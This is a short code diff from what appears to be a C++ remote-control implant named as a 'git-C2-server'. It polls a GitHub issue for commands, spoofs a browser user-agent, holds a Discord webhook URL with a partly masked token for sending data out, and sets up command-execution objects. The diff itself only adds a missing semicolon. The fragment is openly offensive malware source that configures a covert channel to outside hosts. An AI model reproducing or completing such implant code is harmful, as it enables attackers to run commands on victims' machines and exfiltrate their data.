@@ -14,7 +14,7 @@ int main() {
     
     std::string url = "https://github.com/Momollax/git-C2-server/issues/2";
     std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
-    std::string discordWebHook = "https://discord.com/api/webhooks/121749377426xxxxxxx/zbWhTADsVXMMtXVTvzrdCtt5_cB3Zncsxxxxxxxx"
+    std::string discordWebHook = "https://discord.com/api/webhooks/121749377426xxxxxxx/zbWhTADsVXMMtXVTvzrdCtt5_cB3Zncsxxxxxxxx";
     Cmd cmd;
     HtmlParser htmlParser(cmd);
     ExecCmd execCmd("");  
